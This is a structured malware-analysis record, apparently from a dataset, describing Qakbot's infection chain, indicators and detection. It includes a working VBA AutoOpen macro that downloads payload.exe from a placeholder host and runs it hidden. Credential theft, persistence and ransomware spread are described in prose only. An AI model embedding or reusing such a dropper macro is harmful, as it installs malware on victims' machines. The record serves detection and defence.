package_info.package_manager: malware distribution via spam email (not a software package manager)
package_info.package_versions: Active since at least 2008; multiple variants over time
package_info.why_malicious: Qakbot is a long-running malware family distributed via spam emails with malicious attachments and links. It is used for credential theft, lateral movement, and as a platform for ransomware deployment, impacting hundreds of thousands of systems globally. Its infection chain involves initial access via malicious macros, credential exfiltration, persistence mechanisms, and network-wide ransomware propagation.

execution_context.trigger: At document open (import-time), triggered by AutoOpen macro
execution_context.file_location: malicious email attachment (macro-enabled document, e.g., .docm or .xlsm)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.Send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: At import-time, the AutoOpen macro initiates a network request to download a remote executable, writes the binary to the TEMP directory, and executes it in a hidden process, resulting in the initial malware payload being delivered and run.

malice_analysis.why_suspicious: Macros that automatically download and execute remote binaries upon document open are a well-established malware delivery vector, often used to bypass user awareness and endpoint protections.
malice_analysis.violated_expectations: Normal document macros should not perform unsolicited network operations, download executables, or launch new processes without explicit user action and consent.
malice_analysis.similar_legitimate_use: Automated document processing in highly controlled enterprise environments, where macros may fetch updates or templates, but such behavior is rare and tightly monitored.
key_indicators: Presence of AutoOpen macro in Office document
Use of MSXML2.XMLHTTP for outbound HTTP requests
Creation and writing of files to the TEMP directory using ADODB.Stream
Execution of downloaded binaries via Shell with vbHide

execution_context.trigger: At runtime, after initial payload execution
execution_context.file_location: payload.exe (Qakbot main binary, dropped to TEMP directory)

malicious_snippets.code_behavior: At runtime, the Qakbot binary extracts browser and Outlook credentials from the infected system, transmits the stolen data to a remote command-and-control server via HTTPS POST, and establishes persistence by adding itself to the Windows registry Run key, ensuring execution on user logon.

malice_analysis.why_suspicious: The code performs credential dumping and exfiltration to an external server, which is a core behavior of info-stealing malware. The addition of a registry Run key for persistence is a common technique to maintain access after reboot.
malice_analysis.violated_expectations: Legitimate software should not access or transmit user credentials without explicit consent, nor should it modify registry keys to ensure covert persistence.
malice_analysis.similar_legitimate_use: Enterprise credential backup or migration tools may access credentials with user approval and store them securely, and some legitimate software may use registry Run keys for auto-start, but not in conjunction with credential theft.
key_indicators: Credential dumping routines targeting browsers and Outlook
Outbound HTTPS POST requests to C2 infrastructure
Binary execution from TEMP or AppData directories

execution_context.trigger: At runtime, during post-infection lateral movement and ransomware deployment
execution_context.file_location: Qakbot process memory (injected code or downloaded modules)

malicious_snippets.code_behavior: At runtime, the malware enumerates accessible network hosts, copies a ransomware payload to each reachable system, and remotely executes the ransomware, resulting in widespread ransomware infection across the network.

malice_analysis.why_suspicious: Automated lateral movement and remote ransomware deployment are highly malicious, enabling rapid propagation and mass encryption of files across an organization.
malice_analysis.violated_expectations: Normal software should not enumerate network hosts, deploy executables to remote systems, or trigger remote code execution without strict controls, logging, and user authorization.
malice_analysis.similar_legitimate_use: Enterprise software deployment tools may push software to multiple hosts, but such actions are tightly controlled, logged, and never used for ransomware.
key_indicators: Enumeration of network hosts from infected system
Remote file transfer and execution of ransomware payloads
Automated propagation of malicious binaries across network shares or via process injection

attack_chain.action: User receives a spam email containing a malicious macro-enabled document or link. Upon opening the document, the embedded AutoOpen macro executes.
attack_chain.leads_to: Initial malware payload is downloaded from a remote server and executed on the victim's system.

attack_chain.action: The Qakbot payload (payload.exe) runs, extracts browser and Outlook credentials, exfiltrates them to a remote C2 server, and establishes persistence via registry modification.
attack_chain.leads_to: Attacker gains ongoing access to the system and stolen credentials, with the malware set to persist across reboots.

attack_chain.action: Qakbot enumerates network hosts, moves laterally, and deploys ransomware or additional payloads to accessible systems, executing them remotely.
attack_chain.leads_to: Mass ransomware deployment or further compromise of networked systems, resulting in widespread organizational impact.

behavioral_signatures: Office documents containing AutoOpen macros that initiate network requests and drop executables
Credential dumping activity targeting browsers and Outlook, followed by exfiltration to external servers
Unauthorized modification of HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key for persistence
Enumeration of network hosts and remote deployment/execution of payloads indicative of lateral movement and ransomware propagation
file_indicators: Macro-enabled documents (.docm, .xlsm) with embedded AutoOpen macros
Executables named payload.exe or qakbot.exe dropped to %TEMP% or %AppData%\Roaming directories
network_indicators: Outbound HTTP/HTTPS connections to known or suspicious Qakbot C2 domains/IPs (e.g., malicious-domain.com, c2-command-and-control.com)
Unusual HTTPS POST requests immediately following document open events
Lateral network connections to internal hosts for remote file transfer and execution
detection_knowledge.how_to_detect: Monitor for Office documents with AutoOpen macros that perform network operations or drop executables to user directories. Detect credential dumping activity and unauthorized registry modifications for persistence. Correlate outbound connections to known Qakbot C2 infrastructure, especially following document open events. Watch for signs of lateral movement, such as enumeration of network hosts and remote execution of payloads, which may indicate ransomware propagation.
